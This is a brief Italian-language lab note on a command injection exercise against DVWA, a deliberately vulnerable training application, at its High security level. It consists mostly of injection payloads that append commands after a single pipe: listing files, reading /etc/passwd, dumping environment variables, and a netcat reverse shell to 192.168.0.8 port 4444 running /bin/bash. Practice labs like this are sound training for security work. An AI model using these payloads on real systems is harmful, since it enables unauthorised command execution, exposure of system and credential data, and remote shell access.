# DVWA Command Injection - High Level

Data: 2025-02-24
Livello: High

## Payload usati:
127.0.0.1|ls
127.0.0.1|cat /etc/passwd
127.0.0.1|whoami
127.0.0.1|env
127.0.0.1|pwd

## Reverse shell:
127.0.0.1|nc 192.168.0.8 4444 -e /bin/bash

## Risultato:
Bypass riuscito con pipe singolo |
